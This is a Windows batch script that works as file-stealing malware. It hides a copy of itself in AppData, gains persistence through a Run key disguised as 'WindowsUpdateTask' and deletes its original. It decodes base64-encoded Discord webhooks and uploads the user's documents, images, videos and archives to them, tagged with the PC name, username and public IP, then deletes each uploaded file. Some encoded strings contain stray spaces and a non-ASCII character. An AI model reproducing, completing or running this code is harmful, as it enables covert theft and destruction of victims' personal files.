@echo off
setlocal enabledelayedexpansion

set "HIDDEN_DIR=%APPDATA%\SystemServices"
set "EXE_NAME=SysWorker.bat"
set "FINAL_PATH=%HIDDEN_DIR%\%EXE_NAME%"

if /i "%~f0" NEQ "%FINAL_PATH%" (
    if not exist "%HIDDEN_DIR%" mkdir "%HIDDEN_DIR%"
    copy /y "%~f0" "%FINAL_PATH%" >nul
    attrib +h +s "%FINAL_PATH%"
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateTask" /t REG_SZ /d "wscript.exe \"%HIDDEN_DIR%\Launch.vbs\"" /f >nul
    
    echo WScript.Sleep 1000 > "%temp%\wipe.vbs"
    echo Set objFSO = CreateObject^("Scripting.FileSystemObject"^) >> "%temp%\wipe.vbs"
    echo objFSO.DeleteFile^("%~f0"^) >> "%temp%\wipe.vbs"
    
    start /b wscript.exe "%temp%\wipe.vbs"
    exit /b
)

:: --- BASE64 ENCODED WEBHOOKS ---
set "b64[0]=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1ODcxODU0MjEyMjcxMzE0NC9yVndSSnFhUmhfdlpCbVI5Ym5ndGFO bEFzYTBob1MxTFRiUklUT2RoNnFCWTVoS0hLZFNZNFZIdUlDOHpsSzNsbFBQbQ=="
set "b64[1]=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1OTExNzQ4NzUwMDAzODIxMC9DdU94SWZQOGQwNi01LUo4T1ZVVEFU WTRfRVF4OFJVYXpXd0FJN0cyVjlr bEt6ZHhqVXU1Nmt1OXN4ZFgtZE04cTZSQg=="
set "b64[2]=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1OTExNzQ5Njk2MjM4NDAwMi9DNkUyWm1EeXVNU3gtR3A2cDd1RVV0 NExTSThqdUxqbXJHRTRmcWpHY1UwaEFsWmxVcy1rMDVYVnVEbjJaYlUwaFZพYQ=="
set "b64[3]=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1OTExNzUwMjYzNzQwODMxOC9nUkhWSl9UQ3o2ZkV4QVc5Z3Vialgy MTZ1TVVJLTYwRjRqaWRBN3dBWTRNOHFTZUdQV3V5d2otYkQtT2lWTkNWN1h5"
set "b64[4]=aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1OTExNzUwODMyNDc1NzU5NC83Q05WQ2wyWEhrc0RyQjhiMk9nbU VFekU1c19lWTlmVHBoMmpsLVFKSEE4aG1sUVlKQnhjMWZ6NEZ2X24yazhjanhDVA=="
set "webhook_count=5"

for /L %%i in (0,1,4) do (
    for /f "usebackq tokens=*" %%a in (`powershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('!b64[%%i]!'))"`) do set "webhook[%%i]=%%a"
)

set "LOG_DIR=%APPDATA%\FileSender"
set "LOG_FILE=%LOG_DIR%\sent_history.log"
set "QUOTA_FILE=%LOG_DIR%\daily_quota.txt"
set "DAILY_LIMIT=50"
set "MAX_SIZE=10485760"
set "DELAY=3"

if not exist "%LOG_DIR%" mkdir "%LOG_DIR%"

for /f "tokens=2-4 delims=/ " %%a in ('date /t') do set "today=%%c-%%a-%%b"
if exist "%QUOTA_FILE%" (
    for /f "tokens=1,2" %%a in (%QUOTA_FILE%) do (
        if "%%a"=="%today%" (set /a "files_sent=%%b") else (set "files_sent=0")
    )
) else (set "files_sent=0")

if !files_sent! GEQ %DAILY_LIMIT% exit /b

for /f "delims=" %%a in ('curl -s https://api.ipify.org') do set "PUBLIC_IP=%%a"
set "PC_NAME=%COMPUTERNAME%"
set "USER_NAME=%USERNAME%"
set "EXTS=*.pdf *.mp4 *.avi *.mp3 *.pptx *.docx *.png *.jpg *.jpeg *.gif *.zip *.rar *.ogg"
set "current_index=0"

for /R "%USERPROFILE%" %%F in (%EXTS%) do (
    if !files_sent! GEQ %DAILY_LIMIT% exit /b
    if exist "%%F" (
        set "FILE_SIZE=%%~zF"
        if !FILE_SIZE! LSS %MAX_SIZE% (
            set "ACTIVE_URL=!webhook[%current_index%]!"
            set "INFO_MSG=**[LOG]**\n**PC:** %PC_NAME%\n**User:** %USER_NAME%\n**IP:** %PUBLIC_IP%\n**File:** `%%~nxF`"

            for /f "tokens=*" %%A in ('curl -s -o /dev/null -w "%%{http_code}" -F "payload_json={\"content\": \"!INFO_MSG!\"}" -F "file=@%%F" !ACTIVE_URL!') do set "status=%%A"

            if "!status!"=="200" (set "s=1") else if "!status!"=="204" (set "s=1")
            if "!s!"=="1" (
                set /a "files_sent+=1"
                echo %today% !files_sent! > "%QUOTA_FILE%"
                echo [!DATE! !TIME!] SENT: %%~fF >> "%LOG_FILE%"
                del /f /q "%%~fF"
                set "s=0"
                set /a "current_index=(current_index + 1) %% %webhook_count%"
                timeout /t %DELAY% >nul
            )
        )
    )
)
exit /b
